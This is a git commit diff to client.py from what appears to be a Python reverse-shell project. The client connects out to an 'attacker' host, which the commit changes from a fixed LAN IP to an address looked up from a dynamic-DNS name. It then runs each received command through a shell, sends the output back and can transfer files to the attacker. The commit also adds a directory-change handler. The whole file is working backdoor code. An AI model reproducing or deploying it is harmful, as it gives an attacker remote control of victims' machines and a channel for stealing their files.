0958221481b7cf6c503a0aaaadf335e78daebd59
David E Lares S <david.e.lares@gmail.com>
2020-02-02 00:15:05 -0600

    CWD changeability feature completed (fix)

--- client.py
+++ client.py
@@ -17,12 +17,12 @@ def transfer(s,path):
     else:
         s.send('Unable to find out the file')
 
-def connect():
+def connect(ip):
    # AF_INET as a pair of (host,port) | SOCK_STREAM (default mode)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      # Attacker IP with the same port
-    s.connect(('192.168.1.111', 8001))
+    s.connect((ip, 8001))
 
     while True:
         command = s.recv(1024) # receiving communications
@@ -37,6 +37,10 @@ def connect():
                 transfer(s,path)
             except Exception as e:
                 s.send(str(e)) # sending error to the socket
+        elif 'cd' in command:
+            code, directory = command.split(" ") # spliting by space
+            os.chdir(directory) # changing directory
+            s.send("[+] CWD is now: " + os.getcwd()) # send message to attacker
         else:
             # piping the stdout the the subprocess module using the Shell
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -45,5 +49,7 @@ def connect():
             s.send(CMD.stderr.read()) # STERR (return errors)
 
 def main():
-    connect()
+    # getting the DDNS server IP (DNS Lookup)
+    ip = socket.gethostbyname('davidlares.ddns.net')
+    connect(ip)
 main()
